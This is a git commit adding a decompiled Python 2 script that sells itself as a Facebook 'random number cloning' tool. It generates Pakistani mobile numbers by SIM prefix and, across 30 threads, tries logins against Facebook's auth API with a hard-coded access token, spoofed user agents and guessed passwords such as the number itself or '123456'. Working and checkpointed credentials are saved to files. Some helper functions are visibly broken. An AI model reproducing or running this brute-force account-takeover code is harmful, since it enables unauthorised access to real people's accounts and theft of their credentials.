b028d7861158d773d971557bab2f45707c3e14d8
shuvoabalove <116865782+shuvoabalove@users.noreply.github.com>
2022-10-28 10:49:10 +0400

    Add files via upload

---
+++ fuck_mafyia.py
@@ -0,0 +1,202 @@
+# Decompile by Istiak Ahamed Risat :)
+# with (uncompyle6) version : 3.7.4
+# Time Succes decompile : 2022-10-14 12:34:57.062888
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+__author__ = 'MR NAIB'
+__copyright = 'All rights reserved . Copyright  Talha Zubayer'
+CorrectUsername = '313'
+CorrectPassword = '313 '
+os.system('clear')
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;91mENTER TOOL KEY\xe2\x80\xa6\xe2\x80\xa6\xe2\x80\xa6\xe2\x80\xa6=>> :\x1b[1;93m ')
+    if username == CorrectUsername:
+        print '\x1b[1;92m Logged in successfully as '
+        time.sleep(1)
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100008717082810')
+        os.system('clear')
+        loop = 'false'
+    else:
+        print '\x1b[1;93m Wrong Key !'
+        os.system('xdg-open https://wa.me/+923200596325 ')
+        os.system('clear')
+done = False
+os.system('rm -rf .txt')
+for n in range(40000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 .README.md')
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [
+ ('user-agent', "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]Mozilla/5.0 (Linux; Android 10; Nokia 5.3 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 9; ASUS_X00QD Build/PPR1.180610.009; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 BitrixMobile/Version=37Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.11.23.arm64Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 EDMOBILE/gvxmmwysazcipylnpdrruwizjlxwhvgcMozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 GSA/11.43.6.23.arm64Mozilla/5.0 (Linux; Android 11; SM-N970F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 10; Redmi 7A Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 Viber/15.2.0.11Mozilla/5.0 (Linux; Android 8.1.0; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; U; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Version/4.0 Safari/537.36 GBoard_Android GKB/9.2.7.303045247-release-armeabi-v7aMozilla/5.0 (Linux; Android 11; SM-A426B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 10; CPH1937 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 GSA/11.25.11.21.arm64Mozilla/5.0 (Linux; Android 10; VIA A4 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; V2031 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.16.13.23.arm64Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 GoogleApp/12.15.9.23.armMozilla/5.0 (Linux; Android 10; M2006C3LII Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 11; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36 OPT/2.9Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.82 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Microsoft Outlook 16.0.4954; ms-office; MSOffice 16)Mozilla/5.0 (Linux; Android 11; CPH2119 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 10; TECNO KD7 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 10; Nokia 6.1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.72 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; Nokia 6.1 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.41.10.23.arm64Mozilla/5.0 (Linux; Android 9; TECNO KC3 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAN-L12 Build/HUAWEICAN-L12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 10; GM1917 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GoogleApp/12.16.7.23.arm64Mozilla/5.0 (Linux; Android 8.1.0; X21 Build/OPM8.190605.005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36AndroidDownloadManager/7.0 (Linux; U; Android 7.0; HUAWEI CAN-L12 Build/HUAWEICAN-L12Mozilla/5.0 (Linux; U; Android 9; en-us; TECNO CC6 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36 PHX/5.7Mozilla/5.0 (Linux; Android 10; 5061K_EEA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 9; SM-A8050 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 GSA/11.41.10.23.arm64Mozilla/5.0 (Linux; Android 10; VOG-L29 Build/HUAWEIVOG-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.10.7.23.arm64Mozilla/5.0 (Linux; Android 6.0.1; SM-G925F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 GSA/12.15.9.23.arm64Mozilla/5.0 (Linux; Android 11; SM-A505U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.16.13.23.arm64Mozilla/5.0 (Linux; Android 9; moto g(7) Build/PPOS29.114-16-5-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 GSA/8.55.6.21.arm64Mozilla/5.0 (Linux; arm_64; Android 10; VRD-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 YaBrowser/21.3.1.128.00 SA/3 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5 Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 GSA/10.33.5.21.arm64Mozilla/5.0 (Linux; Android 10; SM-J810F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.15.9.23.armMozilla/5.0 (Linux; Android 9; SM-N935F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 GSA/12.16.12.23.arm64Mozilla/5.0 (Linux; Android 5.0.2; vivo Y51L Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 GSA/11.31.12.21.arm64Mozilla/5.0 (Linux; Android 8.0.0; SM-A520L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.1.3216.58602Mozilla/5.0 (Linux; Android 10; GM1910 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/316.0.0.54.116;]Mozilla/5.0 (iPad; CPU OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/158.0.371218587 Mobile/18E212 Safari/604.1user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
+def exb():
+    print '[!] Exit Successfully '
+    os.sys.exit()
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+    return cetak(d)
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+def jalan(x):
+    for e in x + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3.0 / 200)
+def tik():
+    titik = [
+     '   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
+    for o in titik:
+        print '\r\x1b[1;96m \x1b[1;96m               Load\x1b[1;96ming\x1b[1;0m\x1b[1;96m' + o,
+        sys.stdout.flush()
+        time.sleep(0.5)
+logo = "\n\n\n$$\\   $$\\           $$\\ $$\\       \n$$$\\  $$ |          \\__|$$ |      \n$$$$\\ $$ | $$$$$$\\  $$\\ $$$$$$$\\  \n$$ $$\\$$ | \\____$$\\ $$ |$$  __$$\\ \n$$ \\$$$$ | $$$$$$$ |$$ |$$ |  $$ |\n$$ |\\$$$ |$$  __$$ |$$ |$$ |  $$ |\n$$ | \\$$ |\\$$$$$$$ |$$ |$$$$$$$  |\n\\__|  \\__| \\_______|\\__|\\_______/ \n                                          \n  .--,-``-.                .--,-``-.     \n /   /     '.       ,---, /   /     '.   \n/ ../        ;   ,`--.' |/ ../        ;  \n\\ ``\\  .`-    ' /    /  :\\ ``\\  .`-    ' \n \\___\\/   \\   ::    |.' ' \\___\\/   \\   : \n      \\   :   |`----':  |      \\   :   | \n      /  /   /    '   ' ;      /  /   /  \n      \\  \\   \\    |   | |      \\  \\   \\  \n  ___ /   :   |   '   : ;  ___ /   :   | \n /   /\\   /   :   |   | ' /   /\\   /   : \n/ ,,/  ',-    .   '   : |/ ,,/  ',-    . \n\\ ''\\        ;    ;   |.'\\ ''\\        ;  \n \\   \\     .'     '---'   \\   \\     .'   \n  `--`-,,-'                `--`-,,-'     \n  Author: Mr Naib\n  Github:Mafyia313                                                                                                                                                           "
+logo1 = '   \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+cpb = []
+def menu():
+    os.system('clear')
+    print logo
+    print 47 * '-'
+    print
+    jalan('\x1b[1;96m[1] START Random Number Cloning ')
+    print
+    print '\x1b[1;96m[0] TOOL LOGOUT'
+    print
+    print 47 * '-'
+    action()
+def action():
+    global cpb
+    global oks
+    ss = raw_input('\x1b[1;96mselect Optoin =   ')
+    if ss == '':
+        print '[!] Warning'
+        action()
+    elif ss == '1':
+        tik()
+        os.system('clear')
+        print logo
+        print logo1
+        try:
+            c = raw_input('\x1b[1;97mCODE : ')
+            k = '03'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+    elif ss == '0':
+        exb()
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    os.system('clear')
+    print logo
+    jalan('\x1b[1;97mUse without internet sim.minimize termux and check every 10 minutes  later. airplane mode use every 10 mint.')
+    print 47 * '-'
+    xxx = str(len(id))
+    jalan('\x1b[1;97m              TOTAL IDS :\x1b[1;95m ' + xxx)
+    print 47 * '-'
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[92m  [OK-NAIB]  ' + k + c + user + '  |  ' + pass1
+                okb = open('save/CP.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m  [CP-NAIB] ' + k + c + user + '  |  ' + pass1
+                cps = open('save/CP.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = k + c + user
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m  [OK-NAIB] ' + k + c + user + '  |  ' + pass2
+                    okb = open('save/OK.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;92m  [CP-NAIB] ' + k + c + user + '  |  ' + pass2
+                    cps = open('save/CP.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
+                else:
+                    pass3 = '123456'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m  [OK-NAIB]  ' + k + c + user + '  |  ' + pass3
+                        okb = open('save/CP.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;92m  [CP-NAIB] ' + k + c + user + '  |  ' + pass3
+                        cps = open('save/CP.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+        except:
+            pass
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 48 * '-'
+    print 'Process Has Been Completed!...'
+    print 'Total OK : ' + str(len(oks))
+    print 'Total CP : ' + str(len(cpb))
+    print 47 * '-'
+    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
+    jalan('Note : Cp account  10 say 12 days BAD OPEN KRY')
+    raw_input('\n\x1b[1;95m[\x1b[1;98mMetoo_menu_Back\x1b[1;95m]')
+    login()
+if __name__ == '__main__':
+    menu()
+# Mau Ngapain Cuk?
